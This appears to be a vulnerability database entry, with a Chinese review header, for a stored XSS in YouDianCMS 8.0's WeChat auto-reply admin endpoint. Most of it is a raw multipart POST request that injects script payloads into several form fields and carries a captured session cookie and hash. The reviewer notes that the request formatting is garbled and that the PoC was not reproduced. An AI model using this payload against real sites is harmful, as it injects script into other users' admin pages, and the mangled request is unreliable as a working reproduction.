---
source: "hatch 补库批 20260928"
product: "YouDianCMS8.0"
record_type: "unknown"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_role: "unknown"
identifier_status: "unknown"
title: "YouDianCMS 8.0 Storeage XSS"
prerequisites: "来源所述条件，未列明部分仍待核：adminWeChatsettingsaccess andhash/PHPSession; victimview/saveautoreply"
side_effects: "未执行；本文需注意的操作影响：含多个a字段载荷却未说明各自输出点，保存弹窗不足证明持久跨用户而非本次反射"
source_status: "unknown"
id: "vw-c9ea09ec8cc750f4486bc969"
entity_id: "ve-c9ea09ec8cc750f4486bc969"
schema_version: "1"
---

## 核对与使用边界


本文已按保存的全文审阅记录进行文字校订；本轮仅静态核对，未运行 PoC、请求目标或逐图验证。

适用条件与版本记录（来源主张，未列为明确更正的部分仍待权威资料核对）：adminWeChatsettingsaccess andhash/PHPSession; victimview/saveautoreply

- **适用与权限边界（1）**：请求行HTTP版本分裂、multipart边界与Disposition同一行、Content-Typeboundary换行等大量排版损坏。按此限制解释本文结论，版本相同不足以证明所需角色、入口、配置、依赖或可控参数均已满足；原操作和失败记录一并保留。

- **操作与副作用边界（2）**：含多个a字段载荷却未说明各自输出点，保存弹窗不足证明持久跨用户而非本次反射。保留原步骤及请求方法。执行条件包括隔离且获授权的可恢复环境、预先记录相关文件/账号/配置/业务记录状态；响应完成不能等同无副作用，恢复时须核对该操作涉及的实际对象。

- **凭据与会话边界（3）**：Cookie/hash固定值需说明获取条件，最低角色/权限边界缺失。抓包中的会话不能视为未认证访问证明。需重新取得授权测试会话，不能复用文中值。

- **代码与转录边界（4）**：有GitHubissue原源；Storeage拼写及正文跟踪自动回复语义需校订，无修复。相应原代码作为存在此问题的历史样本保留，不能直接当作可运行、成功复现的 PoC；缺失内容需回原稿核对，不据此补造可执行攻击链。

历史原文标识：下文原技术材料按来源保留；仅本节明确确认的更正替代相应旧说法，标为待核的观察仍不是事实确认。

# YouDianCMS 8.0 Storeage XSS

一、漏洞简介
------------

二、漏洞影响
------------

YouDianCMS 8.0

三、复现过程
------------

    POST /index.php/Admin/wx/saveSubscribeReply 
    HTTP/1.1 Host: 127.0.0.1 
    User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:56.0) Gecko/20100101 Firefox/56.0 
    Accept: application/json, text/javascript, /; q=0.01 
    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 
    Referer: http://0-sec.org/index.php/Admin/Wx/subscribereply/l/en/random/1560696407129 
    X-Requested-With: XMLHttpRequest 
    Content-Type: multipart/form-data; 
    boundary=---------------------------17443203555821 
    Content-Length: 2207 
    DNT: 1 
    Connection: close 
    Cookie: PHPSESSID=bkv171om25ji6a51t7dql010h2; youdianAdminLangSet=en; CKFinder_Path=Files%3A%2F%3A1; CKFinder_Settings=TNNDS; youdianMenuTopID=15

    -----------------------------17443203555821 Content-Disposition: form-data; name="ReplyID"

    1 -----------------------------17443203555821 Content-Disposition: form-data; name="TypeID"

    1 -----------------------------17443203555821 Content-Disposition: form-data; name="a1"

    "><scRIPT>alert(1)</SCRIPT> -----------------------------17443203555821 Content-Disposition: form-data; name="a2"

    2 -----------------------------17443203555821 Content-Disposition: form-data; name="a3"

    1 -----------------------------17443203555821 Content-Disposition: form-data; name="a4"

    "><scRIPT>alert(1)</SCRIPT> -----------------------------17443203555821 Content-Disposition: form-data; name="a5"

    1 -----------------------------17443203555821 Content-Disposition: form-data; name="a6"

    -----------------------------17443203555821 Content-Disposition: form-data; name="musicfile"

    -----------------------------17443203555821 Content-Disposition: form-data; name="a11"

    -----------------------------17443203555821 Content-Disposition: form-data; name="a12"

    1 -----------------------------17443203555821 Content-Disposition: form-data; name="a13"

    -----------------------------17443203555821 Content-Disposition: form-data; name="a14"

    -----------------------------17443203555821 Content-Disposition: form-data; name="a15"

    "><scRIPT>alert(1)</SCRIPT> -----------------------------17443203555821 Content-Disposition: form-data; name="a16"

    1 -----------------------------17443203555821 Content-Disposition: form-data; name="a7"

    2 -----------------------------17443203555821 Content-Disposition: form-data; name="a8"

    2,大转盘 -----------------------------17443203555821 Content-Disposition: form-data; name="a10"

    -----------------------------17443203555821 Content-Disposition: form-data; name="a9"

    "><scRIPT>alert(1)</SCRIPT> -----------------------------17443203555821 Content-Disposition: form-data; name="IsEnable"

    1 -----------------------------17443203555821 Content-Disposition: form-data; name="hash"

    19b37a0a1054dfd209b9a17c704027f3_db90bddc24f4e98592b355e2cbbca612 -----------------------------17443203555821--

该漏洞触发的位置在"微信平台"-"自动回复"-"跟踪自动回复"的"微信短信"中，最后点击保存触发。

四、参考链接
------------

> <https://github.com/ReboOt68/youdiancms8.0-StoreageXSS-POC/issues/2>
